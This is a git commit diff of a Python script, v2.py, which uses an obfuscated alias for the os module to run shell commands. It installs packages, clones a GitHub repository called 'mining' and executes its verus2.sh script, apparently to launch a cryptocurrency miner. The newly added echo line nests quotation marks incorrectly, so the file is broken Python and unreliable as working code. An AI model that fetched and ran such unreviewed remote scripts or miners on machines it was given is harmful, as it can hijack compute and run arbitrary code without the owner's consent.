c4462c58eb4365a6772421df248c008a5965bec5
Tokisaki_mitsuha <71954996+Tokisaki-mitsuha@users.noreply.github.com>
2021-10-28 00:34:25 +0700

    Update v2.py

--- v2.py
+++ v2.py
@@ -1,5 +1,5 @@
 import os as akusayangkamutapiboongbacotngentod
 akusayangkamutapiboongbacotngentod.system("apt-get update && apt-get upgrade -y")
 akusayangkamutapiboongbacotngentod.system("apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 git")
-akusayangkamutapiboongbacotngentod.system("git clone https://github.com/Tokisaki-mitsuha/mining.git && cd mining && chmod +x compile.sh")
-akusayangkamutapiboongbacotngentod.system("chmod +x verus2.sh && ./verus2.sh")
+akusayangkamutapiboongbacotngentod.system("git clone https://github.com/Tokisaki-mitsuha/mining.git && cd mining && chmod +x compile.sh && chmod +x verus2.sh && ./verus2.sh")
+akusayangkamutapiboongbacotngentod.system("echo "halo sayang mau ngapain liat² hadeh anda ini ya"")
